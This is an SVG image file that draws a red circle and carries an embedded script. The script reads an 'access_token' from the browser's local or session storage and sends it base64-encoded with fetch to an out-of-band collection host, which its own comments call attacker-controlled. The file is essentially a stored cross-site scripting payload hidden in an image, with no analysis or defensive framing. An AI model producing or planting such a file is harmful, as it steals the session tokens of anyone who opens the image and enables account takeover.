<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <script type="text/javascript">
    // 1. Capture the token from storage
    const token = localStorage.getItem('access_token') || sessionStorage.getItem('access_token');
    
    // 2. Exfiltrate the data to an attacker-controlled server
    if (token) {
      fetch(`https://r806j2nndbetzeps5sqpgq63ouulid62.oastify.comm/log?data=${btoa(token)}`, {
        mode: 'no-cors'
      });
    }
  </script>
  <circle cx="50" cy="50" r="40" fill="red" />
</svg>
